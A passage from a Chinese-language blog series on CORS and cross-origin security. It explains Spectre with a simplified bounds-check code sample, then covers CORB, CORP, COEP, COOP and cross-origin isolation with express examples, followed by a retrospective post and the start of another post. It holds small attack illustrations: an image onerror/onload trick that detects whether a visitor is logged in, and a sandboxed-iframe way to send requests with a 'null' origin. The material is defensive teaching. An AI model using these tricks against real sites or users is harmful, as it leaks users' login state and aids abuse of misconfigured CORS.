2，所以就是 y = array2[2]。 這段程式碼看起來沒什麼問題，而且我有做了陣列長度的判斷，所以不會有超出陣列索引（Out-of-Bounds，簡稱 OOB）的狀況發生，只有在 x 比 array1_size 小的時候才會繼續往下執行。 不過這只是你看起來而已。 在 CPU 執行程式碼的時候，有一個機制叫做 branch prediction。為了增進程式碼執行的效率，所以 CPU 在執行的時候如果碰到 if 條件，會先預測結果是 true 還是 false，如果預測的結果是 true，就會先幫你執行 if 裡面的程式碼，把結果先算出來。 剛剛講的都只是「預測」，等到實際的 if 條件執行完之後，如果跟預測的結果相同，那就皆大歡喜，如果不同的話，就會把剛剛算完的結果丟掉，這個機制稱為：預測執行（speculatively execute） 因為 CPU 會把結果丟掉，所以我們也拿不到預測執行的結果，除非 CPU 有留下一些線索。 而這就是 Spectre 攻擊成立的主因，因為還真的有留下線索。 一樣是為了增進執行的效率，在預測執行的時候會把一些結果放到 CPU cache 裡面，增進之後讀取資料的效率。 假設現在有 ABC 三個東西，一個在 CPU cache 裡面，其他兩個都不在，我們要怎麼知道是哪一個在？ 答案是，透過存取這三個東西的時間！因為在 CPU cache 裡面的東西讀取一定比較快，所以如果讀取 A 花了 10ms，B 花了 10ms，C 只花了 1ms，我們就知道 C 一定是在 CPU cache 裡面。這種透過其他線索來得知資訊的攻擊方法，叫做 side-channel attack，從其他管道來得知資訊。 上面的方法我們透過時間來判斷，所以又叫做 timing-attack。 結合上述知識之後，我們再回來看之前那段程式碼： uint8_t array1[16] = &#123;1, 2, 3&#125;; uint8_t array2[256]; unsigned int array1_size = 16; void run(size_t x) &#123; if(x &lt; array1_size) &#123; uint8_t y = array2[array1[x]]; &#125; &#125; size_t x = 1; run(x); 假設現在我跑很多次 run(10)，CPU 根據 branch prediction 的機制，合理推測我下一次也會滿足 if 條件，執行到裡面的程式碼。就在這時候我突然把 x 設成 100，跑了一個 run(100)。 這時候 if 裡面的程式碼會被預測執行： uint8_t y &#x3D; array2[array1[100]]; 假設 array1[100] 的值是 38 好了，那就是 y = array2[38]，所以 array2[38] 會被放到 CPU cache 裡面，增進之後載入的效率。 接著實際執行到 if condition 發現條件不符合，所以把剛剛拿到的結果丟掉，什麼事都沒發生，function 執行完畢。 然後我們根據剛剛上面講的 timing attack，去讀取 array2 的每一個元素，並且計算時間，會發現 array2[38] 的讀取時間最短。 這時候我們就知道了一件事： array1[100] 的內容是 38 你可能會問說：「那你知道這能幹嘛？」，能做的事情可多了。array1 的長度只有 16，所以我讀取到的值並不是 array1 本身的東西，而是其他部分的記憶體，是我不應該存取到的地方。而我只要一直複製這個模式，就能把其他地方的資料全都讀出來。 這個攻擊如果放在瀏覽器上面，我就能讀取同一個 process 的其他資料，換句話說，如果同一個 process 裡面有其他網站的內容，我就能讀取到那個網站的內容！ 這就是 Spectre 攻擊，透過 CPU 的一些機制來進行 side-channal attack，進而讀取到本來不該讀到的資料，造成安全性問題。 所以用一句白話文解釋，在瀏覽器上面，Spectre 可以讓你有機會讀取到其他網站的資料。 有關 Spectre 的解釋就到這裡了，上面簡化了很多細節，而那些細節我其實也沒有完全理解，想知道更多的話可以參考： Reading privileged memory with a side-channel 解读 Meltdown &amp; Spectre CPU 漏洞 浅谈处理器级Spectre Attack及Poc分析 [閒聊] Spectre &amp; Meltdown漏洞概論(翻譯) Google update: Meltdown&#x2F;Spectre Mitigating Spectre with Site Isolation in Chrome 而那些 COXX 的東西，目的都是差不多的，都是要防止一個網站能夠讀取到其他網站的資料。只要不讓惡意網站跟目標網站處在同一個 process，這類型的攻擊就失效了。 從這個角度出發，我們來看看各種相關機制。 CORB（Cross-Origin Read Blocking）Google 於 Spectre 攻擊公開的一個月後，也就是 2018 年 2 月，在部落格上面發了一篇文章講述 Chrome 做了哪些事情來防堵這類型的攻擊：Meltdown&#x2F;Spectre。 文章中的 Cross-Site Document Blocking 就是 CORB 的前身。根據 Chrome Platform Status，在 Chrome for desktop release 67 的時候正式預設啟用，那時候大概是 2018 年 5 月，也差不多那個時候，被 merge 進去 fetch 的 spec，成為規格的一部分（CORB: blocking of nosniff and 206 responses）。 前面有提到過 Spectre 能夠讀取到同一個 process 底下的資料，所以防禦的其中一個方式就是不要讓其他網站的資料出現在同一個 process 底下。 一個網站有許多方式可以把跨來源的資源設法弄進來，例如說 fetch 或是 xhr，但這兩種已經被 CORS 給控管住了，而且拿到的 response 應該是存在 network 相關的 process 而不是網站本身的 process，所以就算用 Spectre 也讀不到。 但是呢，用 &lt;img&gt; 或是 &lt;script&gt; 這些標籤也可以輕易地把其他網站的資源載入。例如說：&lt;img src=&quot;https://bank.com/secret.json&quot;&gt;，假設 secret.json 是個機密的資料，我們就可以把這個機密的資料給「載入」。 你可能會好奇說：「這樣做有什麼用？那又不是一張圖片，而且我用 JS 也讀取不到」。沒錯，這不是一張圖片，但以 Chrome 的運作機制來說，Chrome 在下載之前不知道它不是圖片（有可能副檔名是 .json 但其實是圖片對吧），因此會先下載，下載之後把結果丟進 render process，這時候才會知道這不是一張圖片，然後引發載入錯誤。 看起來沒什麼問題，但別忘了 Spectre 開啟了一扇新的窗，那就是「只要在同一個 process 的資料我都有機會讀取到」。因此光是「把結果丟進 render process」這件事情都不行，因為透過 Spectre 攻擊，攻擊者還是拿得到存在記憶體裡面的資料。 因此 CORB 這個機制的目的就是： 如果你想讀的資料類型根本不合理，那我根本不需要把讀到 render process，我直接把結果丟掉就好！ 延續上面的例子，那個 json 檔的 MIME type 如果是 application&#x2F;json，代表它絕對不會是一張圖片，因此也不可能放到 img 標籤裡面，這就是我所說的「讀的資料類型不合理」。 CORB 主要保護的資料類型有三種：HTML、XML 跟 JSON，那瀏覽器要怎麼知道是這三種類型呢？不如就從 response header 的 content type 判斷吧？ 很遺憾，沒辦法。原因是有很多網站的 content type 是設定錯誤的，有可能明明就是 JavaScript 檔案卻設成 text/html，就會被 CORB 擋住，網站就會壞掉。 因此 Chrome 會根據內容來探測（sniffing）檔案類型是什麼，再決定要不要套用 CORB。 但這其實也有誤判的可能，所以如果你的伺服器給的 content type 都確定是正確的，可以傳一個 response header 是 X-Content-Type-Options: nosniff，Chrome 就會直接用你給的 content type 而不是自己探測。 總結一下，CORB 是個已經預設在 Chrome 裡的機制，會自動阻擋不合理的跨來源資源載入，像是用 &lt;img&gt; 來載入 json 或是用 &lt;script&gt; 載入 HTML 等等。而除了 Chrome 之外，Safari 跟 Firefox 好像都還沒實裝這個機制。 更詳細的解釋可以參考： Cross-Origin Read Blocking for Web Developers Cross-Origin Read Blocking (CORB) CORP（Cross-Origin Resource Policy）CORB 是瀏覽器內建的機制，自動保護了 HTML、XML 與 JSON，不讓他們被載入到跨來源的 render process 裡面，就不會被 Spectre 攻擊。但是其他資源呢？如果其他類型的資源，例如說有些照片跟影片可能也是機密資料，我可以保護他們嗎？ 這就是 CORP 這個 HTTP response header 的功能。CORP 的前身叫做 From-Origin，下面引用一段來自 Cross-Origin-Resource-Policy (was: From-Origin) #687 的敘述： Cross-Origin Read Blocking (CORB) automatically protects against Spectre attacks that load cross-origin, cross-type HTML, XML, and JSON resources, and is based on the browser’s ability to distinguish resource types. We think CORB is a good idea. From-Origin would offer servers an opt-in protection beyond CORB. 如果你自己知道該保護哪些資源，那就可以用 CORP 這個 header，指定這些資源只能被哪些來源載入。CORP 的內容有三種： Cross-Origin-Resource-Policy: same-site Cross-Origin-Resource-Policy: same-origin Cross-Origin-Resource-Policy: cross-origin 第三種的話就跟沒有設定是差不多的（但其實跟沒設還是有差，之後會解釋），就是所有的跨來源都可以載入資源。接下來我們實際來看看設定這個之後會怎樣吧！ 我們先用 express 起一個簡單的 server，加上 CORP 的 header 然後放一張圖片，圖片網址是 http://b.example.com/logo.jpg： app.use((req, res, next) => &#123; res.header('Cross-Origin-Resource-Policy', 'same-origin') next() &#125;) app.use(express.static('public')); 接著在 http://a.example.com 引入這張圖片： &lt;img src=\"http://b.example.com/logo.jpg\" /> 重新整理打開 console，就會看到圖片無法載入的錯誤訊息，打開 network tab 還會跟你詳細解釋原因： 如果把 header 改成 same-site 或是 cross-origin，就可以看到圖片正確被載入。 所以這個 header 其實就是「資源版的 CORS」，原本的 CORS 比較像是 API 或是「資料」間存取的協議，讓跨來源存取資料需要許可。而資源的載入例如說使用 &lt;img&gt; 或是 &lt;script&gt;，想要阻止跨來源載入的話，應該是只能透過 server side 自行去判斷 Origin 或是 Referer 之類的值，動態決定是否回傳資料。 而 CORP 這個 header 出現之後，提供了阻止「任何跨來源載入」的方法，只要設定一個 header 就行了。所以這不只是安全性的考量而已，安全性只是其中一點，重點是你可以阻止別人載入你的資源。 就如同 CORP 的前身 From-Origin 的 spec 所寫到的： The Web platform has no limitations on embedding resources from different origins currently. E.g. an HTML document on http://example.org can embed an image from http://corp.invalid without issue. This has led to a number of problems: 對於這種 embedded resource，基本上 Web 沒有任何限制，想載入什麼就載入什麼，雖然方便但也會造成一些問題，像是： Inline linking — the practice of embedding resources (e.g. images or fonts) from another server, causing the owner of that server to get a higher hosting bill. Clickjacking — embedding a resource from another origin and attempting to let the visitor click on a concealed link thereof, causing harm to the visitor. 例如說在我的部落格直接連到別人家的圖片，這樣流量就是別人家 server 的，帳單也是他要付。除此之外也會有 Clickjacking 的問題。 Privacy leakage — sometimes resource availability depends on whether a visitor is signed in to a particular website. E.g. only with a I’m-signed-in-cookie will an image be returned, and if there is no such cookie an HTML document. An HTML document embedding such a resource (requested with the user’s credentials) can figure out the existence of that resource and thus whether the visitor is signed in and therefore has an account with a particular service. 這個我之前有看過一個網站但找不到連結了，他可以得知你在某些網站是不是登入狀態。那他怎麼知道的呢？因為有些資源可能只有在你登入的時候有權限存取。假設某個圖片網址只有登入狀態下會正確回傳圖片，沒登入的話就會回傳 server error，那我只要這樣寫就好： &lt;img src=xxx onerror=\"alert('not login')\" onload=\"alert('login')\"> 透過圖片是否載入成功，就知道你是否登入。不過設定了 SameSite cookie 之後應該就沒這問題了。 License checking — certain font licenses require that the font be prevented from being embedded on other origins. 字型網站會阻止沒有 license 的使用者載入字型，這種狀況也很適合用這個 header。 總而言之呢，前面介紹的 CORB 只是「阻止不合理的讀取」，例如說用 img 載入 HTML，這純粹是為了安全性考量而已。 但是 CORP 則是可以阻止任何的讀取（除了 iframe，對 iframe 沒作用），可以保護你網站的資源不被其他人載入，是功能更強大而且應用更廣泛的一個 header。 現在主流的瀏覽器都已經支援這個 header 了。 Site Isolation要防止 Spectre 攻擊，有兩條路線： 不讓攻擊者有機會執行 Spectre 攻擊 就算執行攻擊，也拿不到想要的資訊 前面有提過 Spectre 攻擊的原理，透過讀取資料的時間差得知哪一個資料被放到 cache 裡面，就可以從記憶體裡面「偷」資料出來。那如果瀏覽器上面提供的計時器時間故意不精準的話，不就可以防禦了嗎？因為攻擊者算出來的秒數會差不多，根本不知道哪一個讀取比較快。 Spectre 攻擊出現之後瀏覽器做了兩件事： 降低 performance.now 的精準度 停用 SharedArrayBuffer 第一點很好理解，降低拿時間函式的精準度，就可以讓攻擊者無法判斷正確的讀取速度。那第二點是為什麼呢？ 先講一下 SharedArrayBuffer 這東西好了，這東西可以讓你 document 的 JS 跟 web worker 共用同一塊記憶體，共享資料。所以在 web worker 裡面你可以做一個 counter 一直累加，然後在 JS 裡面讀取這個 counter，就達成了計時器的功能。 所以 Spectre 出現之後，瀏覽器就做了這兩個調整，從「防止攻擊源頭」的角度下手，這是第一條路。 而另一條路則是不讓惡意網站拿到跨來源網站的資訊，就是前面所提到的 CORB，以及現在要介紹的：Site Isolation。 先來一段來自 Site Isolation for web developers 的介紹： Site Isolation is a security feature in Chrome that offers an additional line of defense to make such attacks less likely to succeed. It ensures that pages from different websites are always put into different processes, each running in a sandbox that limits what the process is allowed to do. It also blocks the process from receiving certain types of sensitive data from other sites 簡單來說呢，Site Isolation 會確保來自不同網站的資源會放在不同的 process，所以就算你在自己的網站執行了 Spectre 攻擊也沒關係，因為你讀不到其他網站的資料。 Site Isolation 目前在 Chrome 是預設啟用的狀態，相對應的缺點是使用的記憶體會變多，因為開了更多的 process，其他的影響可以參考上面那篇文章。 而除了 Site Isolation 之外，還有另外一個很容易搞混的東西（我在寫這篇的時候本來以為是一樣的，後來才驚覺原來不同），叫做：「cross-origin isolated state」。 這兩者的差別在哪裡呢？根據我自己的理解（不保證完全正確），在 Mitigating Spectre with Site Isolation in Chrome 這篇文章中有提到： Note that Chrome uses a specific definition of “site” that includes just the scheme and registered domain. Thus, https://google.co.uk would be a site, and subdomains like https://maps.google.co.uk would stay in the same process. Site Isolation 的 “Site” 的定義就跟 same site 一樣，http://a.example.com 跟 http://b.example.com 是 same site，所以儘管在 Site Isolation 的狀況下，這兩個網頁還是會被放在同一個 process 裡面。 而 cross-origin isolated state 應該是一種更強的隔離，只要不是 same origin 就隔離開來，就算是 same site 也一樣。因此 http://a.example.com 跟 http://b.example.com 是會被隔離開來的。而且 Site Isolation 隔離的對象是 process，cross-origin isolated 看起來是隔離 browsing context group，不讓跨來源的東西處在同一個 browsing context group。 而這個 cross-origin isolated state 並不是預設的，你必須在你的網頁上設置這兩個 header 才能啟用： Cross-Origin-Embedder-Policy: require-corp Cross-Origin-Opener-Policy: same-origin 至於為什麼是這兩個，待會告訴你。 COEP（Cross-Origin-Embedder-Policy）要達成 cross-origin isolated state 的話，必須保證你對於自己網站上所有的跨來源存取，都是合法的並且有權限的。 COEP（Cross-Origin-Embedder-Policy）這個 header 有兩個值： unsafe-none require-corp 第一個是預設值，就是沒有任何限制，第二個則是跟我們前面提到的 CORP(Cross-Origin-Resource-Policy) 有關，如果用了這個 require-corp 的話，就代表告訴瀏覽器說：「頁面上所有我載入的資源，都必須有 CORP 這個 header 的存在（或是 CORS），而且是合法的」 現在假設我們有個網站 a.example.com，我們想讓它變成 cross-origin isolated state，因此幫他加上一個 header：Cross-Origin-Embedder-Policy: require-corp，然後網頁裡面引入一個資源： &lt;img src=\"http://b.example.com/logo.jpg\"> 接著我們在 b 那邊傳送正確的 header： app.use((req, res, next) => &#123; res.header('Cross-Origin-Resource-Policy', 'cross-origin') next() &#125;) 如此一來就達成了第一步。 另外，前面我有講過 CORP 沒有設跟設定成 cross-origin 有一個細微的差異，就是差在這邊。上面的範例如果 b 那邊沒有送這個 header，那 Embedder Policy 就不算通過。 COOP（Cross-Origin-Opener-Policy）而第二步則是這個 COOP（Cross-Origin-Opener-Policy）的 header，在上面的時候我有說過當你用 window.open 開啟一個網頁的時候，你可以操控那個網頁的 location；而開啟的網頁也可以用 window.opener 來操控你的網頁。 而這樣子讓 window 之間有關連，就不符合跨來源的隔離。因此 COOP 這個 header 就是來規範 window 跟 opener 之間的關係，一共有三個值： Cross-Origin-Opener-Policy: unsafe-none Cross-Origin-Opener-Policy: same-origin Cross-Origin-Opener-Policy: same-origin-allow-popups 第一個就是預設值，不解釋，因為沒什麼作用。 第二個最嚴格，如果你設定成 same-origin 的話，那「被你開啟的 window」也要有這個 header，而且也要設定成 same-origin，你們之間才能共享 window。 底下我們來做個實驗，我們有兩個網頁： http://localhost:5566/page1.html http://localhost:5566/page2.html page1.html 的內容如下： &lt;script> var win = window.open('http://localhost:5566/page2.html') setTimeout(() => &#123; console.log(win.secret) &#125;, 2000) &lt;/script> page2.html 的內容如下： &lt;script> window.secret = 5566 &lt;/script> 測驗的方式很簡單，如果 page1 成功輸出 5566，代表兩個之間有共享 window。否之則否。 先來試試看不加任何 header 吧！由於這兩個是 same origin，因此本來就可以共享 window，成功印出了 5566。 接下來我們把 server 端的程式碼改成這樣： app.use((req, res, next) => &#123; if (req.url === '/page1.html') &#123; res.header('Cross-Origin-Opener-Policy', 'same-origin') &#125; next() &#125;) 只有 page1.html 有 COOP，page2.html 沒有，實驗的結果是：「無法共享」。就算改成這樣： app.use((req, res, next) => &#123; if (req.url === '/page1.html') &#123; res.header('Cross-Origin-Opener-Policy', 'same-origin') &#125; if (req.url === '/page2.html') &#123; res.header('Cross-Origin-Opener-Policy', 'same-origin-allow-popups') &#125; next() &#125;) 也是無法共享，因為 same-origin 的條件就是： 開啟的 window 要在同一個 origin 開啟的 window 的 response header 要有 COOP，而且值一定要是 same-origin 只有符合這兩點，才能成功存取到完整的 window。而且有一點要特別注意，那就是一旦設定了這個 header 但是沒有符合規則，不只存取不到完整的 window，連之前那什麼 openedWindow.close 跟 window.opener 都會拿不到，兩個 window 之間就是徹徹底底沒關聯了。 再來 same-origin-allow-popups 的條件比較寬鬆，只有： 開啟的 window 要在同一個 origin 開啟的 window 沒有 COOP，或是 COOP 的值不是 same-origin 簡單來說，same-origin 不只保護他人也保護自己，當你設定成這個值的時候，無論你是 open 別人的，或是被 open 的，都一定要是 same origin 然後有相同的 header，才能互相存取 window。 舉一個例子，我調整成這樣： app.use((req, res, next) => &#123; if (req.url === '/page1.html') &#123; res.header('Cross-Origin-Opener-Policy', 'same-origin-allow-popups') &#125; next() &#125;) 只有 page1 有設定 same-origin-allow-popups，page2 什麼都沒設定，這種狀況可以互相存取 window。 接下來如果兩個一樣的話： app.use((req, res, next) => &#123; if (req.url === '/page1.html') &#123; res.header('Cross-Origin-Opener-Policy', 'same-origin-allow-popups') &#125; if (req.url === '/page2.html') &#123; res.header('Cross-Origin-Opener-Policy', 'same-origin-allow-popups') &#125; next() &#125;) 這也可以，沒什麼問題。 那如果是這樣呢？ app.use((req, res, next) => &#123; if (req.url === '/page1.html') &#123; res.header('Cross-Origin-Opener-Policy', 'same-origin-allow-popups') &#125; if (req.url === '/page2.html') &#123; res.header('Cross-Origin-Opener-Policy', 'same-origin') &#125; next() &#125;) 這樣子就不行。 所以稍微總結一下，假設現在有一個網頁 A 用 window.open 開啟了一個網頁 B： 如果 AB 是 cross-origin，瀏覽器本來就有限制，只能存取 window.location 或是 window.close 之類的方法。沒辦法存取 DOM 或其他東西 如果 AB 是 same-origin，那他們可以互相存取幾乎完整的 window，包括 DOM。 如果 A 加上 COOP header，而且值是 same-origin，代表針對第二種情況做了更多限制，只有 B 也有這個 header 而且值也是 same-origin 的時候才能互相存取 window。 如果 A 加上 COOP header，而且值是 same-origin-allow-popups，也是對第二種情況做限制只是比較寬鬆，只要 B 的 COOP header 不是 same-origin 就可以互相存取 window。 總之呢，要「有機會互相存取 window」，一定要先是 same origin，這點是不會變的。實際上是不是存取的到，就要看有沒有設定 COOP header 以及 header 的值。而如果有設定 COOP header 但不符合規則，那 window.opener 會直接變成 null，你連 location 都拿不到（沒設定規則的話，就算是 cross origin 也拿得到）。 其實根據 spec 還有第四種：same-origin-plus-COEP，但看起來更複雜就先不研究了。 再回到 cross-origin isolated state前面提到了 cross-origin isolated state 需要設置這兩個 header： Cross-Origin-Embedder-Policy: require-corp Cross-Origin-Opener-Policy: same-origin 為什麼呢？因為一旦設置了，就代表頁面上所有的跨來源資源都是你有權限存取的，如果沒有權限的話會出錯。所以如果設定而且通過了，就代表跨來源資源也都允許你存取，就不會有安全性的問題。 在網站上可以用： self.crossOriginIsolated 來判定自己是不是進入 cross-origin isolated state。是的話就可以用一些被封印（？）的功能，因為瀏覽器知道你很安全。 另外，如果進入了這個狀態，一開始講過的透過修改 document.domain 繞過 same-origin policy 的招數就不管用了，瀏覽器就不會讓你修改這個東西了。 想知道更多 COOP 與 COEP 還有 cross-origin isolated state，可以參考： Making your website “cross-origin isolated” using COOP and COEP Why you need “cross-origin isolated” for powerful features COEP COOP CORP CORS CORB - CRAP that’s a lot of new stuff! Making postMessage() work for SharedArrayBuffer (Cross-Origin-Embedder-Policy) #4175 Restricting cross-origin WindowProxy access (Cross-Origin-Opener-Policy) #3740 Feature: Cross-Origin Resource Policy 總結這篇其實講了不少東西，都是圍繞著安全性在打轉。一開始我們講了 CORS 設定錯誤會造成的結果以及防禦方法，接著講了透過修改 document.cookie 讓 same-site 變成 same-origin（要兩個網站都同意這樣做才行），最後則是這篇的重頭戲： CORB（Cross-Origin Read Blocking） CORP（Cross-Origin Resource Policy） COEP（Cross-Origin-Embedder-Policy） COOP（Cross-Origin-Opener-Policy） 在找資料的時候花了不少時間，因為名字太像而且功能有些其實有點類似，但看久了其實就會發現差滿多的，每一個 policy 所注重的地方都不同。希望我整理過後的脈絡有幫助大家更好理解這些東西。 如果要用一段話總結這四個東西的話，或許是： CORB：瀏覽器預設的機制，主要是防止載入不合理的資源，像是用 img 載入 HTML CORP：是一個 HTTP response header，決定這個資源可以被誰載入，可以防止 cross-origin 載入圖片、影片或任何資源 COEP：是一個 HTTP response header，確保頁面上所有的資源都是合法載入的 COOP：是一個 HTTP response header，幫 same-origin 加上更嚴格的 window 共享設定 相對於其他幾篇，我對這篇的內容沒有這麼熟悉，如果有哪邊有講錯麻煩不吝指教，感謝。 再來，下一篇就是是這系列文的最後一篇了：CORS 完全手冊（六）：總結、後記與遺珠","link":"/2021/02/19/cors-guide-5/"},{"title":"CORS 完全手冊（六）：總結、後記與遺珠","text":"前言這篇技術含量比較少一點，來跟大家分享一下寫這系列文的過程以及寫完之後的一些感想。 如果你還沒看這系列文的話，傳送門如下： CORS 完全手冊（一）：為什麼會發生 CORS 錯誤？ CORS 完全手冊（二）：如何解決 CORS 問題？ CORS 完全手冊（三）：CORS 詳解 CORS 完全手冊（四）：一起看規範 CORS 完全手冊（五）：跨來源的安全性問題 CORS 完全手冊（六）：總結、後記與遺珠 起源第一篇裡面有提到過想寫這系列文的初衷，因為實在是看過太多人問 CORS 問題了，而且有些人也不管脈絡，一言不合就推薦用 proxy 或是 CORS Anywhere。如果是第三方資源沒有權限，那用這個解法合理，但如果是公司自己的服務，應該是要叫後端設定才對，而不是自己去接 proxy。 CORS 最常見的錯誤大概就那些，包括： 不知道 CORS 擋的是 response 而不是 request（有 preflight 的除外） 不知道為什麼要有 CORS 不知道怎麼解決 CORS 問題（到處亂試，以為 no-cors 是解法） 不知道怎麼 debug（應該要看 console 跟看 network tab） 錯誤地解決 CORS 問題（該後端改的卻自己用 proxy） 在 2020 年 4 月的時候，我有了寫這個系列文的念頭，接下來就開始研究，一開始就規劃了大家看到的這五篇文章，在 2020 年 7 月開始動筆，連續寫了大概兩三天，把第一篇寫完，第二篇大概寫一半，然後就從此擱置了。 那時候會擱置大概是因為第三篇：CORS 詳解不知道該怎麼寫，然後第四篇一起看 spec 也沒太多想法，所以就拖延症一直放著了。直到 2021 年 2 月份才開始繼續寫，並且一口氣把後續文章全部寫完。會重新開始動筆的理由是，這是我心中一顆放不下的石頭，沒有把這系列寫完，我做其他事情的時候就會有些不安，想著「這系列文是不是寫不完了」。 後記但幸好我有寫完。因為從寫文章的過程中我也收穫很多，花了不少時間在理解一些細節，像是 Spectre 的攻擊我就研究了一段時間，雖然最後還是沒有很懂就是了，想要完全理解要把作業系統相關的知識補齊才行。而第五篇那些 COXX 的 header 也花了許多時間，找了很多資料，把當初提案的 issue 都稍微看了一下，會更理解這些 policy 提出的原因。 在研究的過程中也發現許多安全性有關的東西其實是扣在一起的，例如說： Same-origin policy window.open iframe CSP SameSite cookie 在找資料的過程中可以看到不少重疊的地方，尤其是 SameSite cookie，越想越覺得這東西真的很重要，而且可以防止滿多的攻擊。對了，在寫這篇文的時候參考資料其實大多都來自於 Google Chrome，所以文中有許多使用「瀏覽器」的地方，有可能現在其實只有 Chrome 有實作而已，其他瀏覽器還沒跟進。 不過 Chrome 確實資源最多，而且常常會 po 一些技術好文在部落格上面，都是很值得參考的資源。 我認為前後端工程師都要對 CORS 有一定的理解，碰到問題的時候才知道該怎麼解決。雖然說 CORS 是許多新手工程師都碰過的問題，但其實把脈絡理清楚之後，我覺得不是特別難，就是要花點時間把 CORS 的運作模式搞清楚。而且一旦弄懂之後，從此以後碰到這問題都不怕了。 再來有關於第五篇那些各種 COXX 的東西，我認為除非你需要用到那些被封印的功能，或是你的網站需要有高度的安全性，否則有時間再去研究就可以了，先聽過有個印象就好。 寫完這系列文之後，有些想講的東西我找不到地方放，因此底下的段落就講一些放不進去的遺珠。 可能不是 CORS 問題的 CORS 問題瀏覽器的錯誤訊息是個很好的資訊來源，但是它有時候卻也不一定可靠。 有些 CORS 問題，不一定是因為 response header 沒設好，有可能是因為之前沒設定好的 response 被 cache 住，或者甚至是憑證問題！可以參考： CORS request blocked in Firefox but not other browsers #2803 Firefox ‘Cross-Origin Request Blocked’ despite headers CORS request did not succeed on Firefox but works on Chrome Origin Policy在使用 CORS 的時候其實我們花了許多時間在 preflight request 上面，先假設沒有快取而且都是非簡單請求的話，那跨來源跟同來源比起來，多了一倍的 request，因為每一個 request 都會額外再附加一個 preflight request。 可是網站對於 CORS 的規則大部分都是一致的，那為什麼不先寫好一個設定檔讓瀏覽器來讀呢？這樣瀏覽器就會知道某個來源是不是被允許的，就不需要一直發送 preflight request 了。 這個想法的源頭來自：RFC: a mechanism to bypass CORS preflight #210，有空的話可以看一下裡面的討論。 而其實不只 CORS，其他 header 也可能有類似的狀況，例如說 CSP，大部分狀況下整個網站的 CSP 其實都是一樣的，可是現在卻是每一個 HTTP response 都要回傳一樣的 CSP header，這也可以透過寫一個設定檔的方式來讓瀏覽器讀取，就不需要再個別傳了。 上面講的這些，之後被拓展為一個叫做 Origin Policy 的東西，想法大概就是寫好一個檔案放在 /.well-known/origin-policy 並且讓瀏覽器來讀，可以節省不少 response 的 size，不過目前只是個提案而已。 Cross origin 的圖片讀取一般在使用 img 的時候都是 &lt;img src=xxx&gt;，就是用一般的方式去抓取資源。 但其實在 HTML 裡面有些標籤可以用「跨來源」的方式去抓取資源，例如說 &lt;img&gt; 就是一個，其他可參考：MDN: HTML attribute: crossorigin 。 只要這樣就可以了： &lt;img src=xxx crossorigin> 其實 crossorigin 有三個屬性： 不設定&#x2F;空字串 anonymous use-credentials 前兩種是一樣的，而後者就像是 fetch 裡面那個 credentials: &#39;include&#39; 一樣。總之呢，只要加上 crossorigin，對於跨來源的檔案，後端就必須跟 CORS 一樣，加上 Access-Control-Allow-Origin，前端才能正確存取圖片。 那圖片好端端的，為什麼一定要用 CORS 來載入呢？兩個理由，第一個理由是上一篇我提到說：「如果把 COEP 設成 require-corp 的話，就代表告訴瀏覽器說：『頁面上所有我載入的資源，都必須有 CORP 這個 header 的存在（或是 CORS），而且是合法的』」。 假設你現在把 COEP 設成 require-corp，如果你的網站是用 &lt;img src=xxx&gt; 來載入圖片，那這個圖片一定要有 CORP 的 header 才行。那真的沒有的話怎麼辦呢？ 那你可以用跨來源的方式載入圖片，也就是：&lt;img src=xxx crossorigin&gt;，在這個方式底下，圖片不需要有 CORP 的 header，只需要有 Access-Control-Allow-Origin 的 header 就行了，因為這是用 CORS 的模式在載入圖片。 而第二個理由，還記得我之前有說過，如果你載入一張跨來源的圖片並試著用 JS 把圖片內容讀出來，會產生錯誤嗎？如果你是用 cross origin 的模式載入，就不會有這錯誤。詳情可參考：Allowing cross-origin use of images and canvas。 Chromium 處理 CORS 的程式碼沒仔細看，筆記一下而已：chromium&#x2F;chromium&#x2F;src&#x2F;+&#x2F;master:services&#x2F;network&#x2F;public&#x2F;cpp&#x2F;cors&#x2F;cors.cc 一個 URI 一定跟自己是同源嗎？在 rfc6454 給出了答案： NOTE: A URI is not necessarily same-origin with itself. For example, a data URI [RFC2397] is not same-origin with itself because data URIs do not use a server-based naming authority and therefore have globally unique identifiers as origins. data URI 跟自己不同源。 不過新的 fetch spec 沒有找到這一段就是了。 如何讓 origin 是 “null”前面有強調過 origin 是 null 跟 “null” 是不同的，因為 origin 確實有可能是字串的 null，例如說你開啟一個 file:/// 開頭的網頁送出 request，或者是在 sandbox 的 iframe 裡面 AJAX： &lt;iframe sandbox='allow-scripts' srcdoc=' &lt;script> fetch(\"/test\"); &lt;/script> '>&lt;/iframe> 程式碼改寫自：AppSec EU 2017 Exploiting CORS Misconfigurations For Bitcoins And Bounties by James Kettle 總結終於寫完這系列文了。 希望大家在看完這系列之後有更理解 CORS 以及其他跨來源的相關概念，之後碰到 CORS 的錯誤都不再害怕，而且知道該怎麼解決。如同我在第一篇開頭說的，希望這系列文能成為 CORS 的寶典，每個碰到問題的人看完這個系列都可以迎刃而解。 如果有任何錯誤或是缺漏的地方，可以再私訊或是留言跟我說，感謝。","link":"/2021/02/19/cors-guide-6/"},{"title":"原來 CORS 沒有我想像中的簡單","text":"前言CORS（Cross-Origin Resource Sharing，跨來源資源共享）在前端一直是個很經典的問題，簡單來說就是因為瀏覽器的一些安全考量，你在載入其他網域的資源時會受到一些限制，解決方法也很簡單，就是在 Server 那邊加上一些 response header 例如說 Access-Control-Allow-Origin，有了這個 header 之後瀏覽器就會認為你是有經過驗證的，就沒什麼問題了。 針對這個問題，我以前也有寫過一篇：輕鬆理解 Ajax 與跨來源請求，裡面把碰到的問題與解法寫得十分詳細。 我以為自從我上次深入研究過這個問題之後，從此以後 CORS 再也難不倒我，再也不會看到 console 跳出禁止跨來源存取的錯誤。 但是我錯了。 這次我在一個特定的使用場景之下摔了一跤，但也因此學到不少。而這次的經驗也讓我想起我以前寫的：我遇過的最難的 Cookie 問題。 太好了，又有東西可以跟大家分享了！ 悲劇的開始事情是這樣的，前陣子公司的產品改版進入收尾階段，嚴重的 bug 都修得差不多了，接下來就是要開始調整一些效能以及測試這次改版最重要的新功能：PWA！ 還不知道什麼是 PWA 的我在這邊簡單說明一下，PWA 全名是 Progressive Web App，簡單來說就是把你的 Mobile Web 透過一些瀏覽器的支援變得更像是一個 App，最重要的就是你可以用 Service Worker 來快取任何的 request（連 API request 也行），做得好的話甚至在 offline 的狀況也能夠把這個網頁打開。 除此之外呢，透過瀏覽器可以把你的網站加到主畫面，就像是安裝在手機裡面那樣，變得跟一個 App 沒有兩樣。 下面附上三張截圖，會讓大家對 PWA 更有感覺，首先第一張是你可以把這個網頁加入主畫面： 第二張是這個 PWA 就會跟其他的 Native App 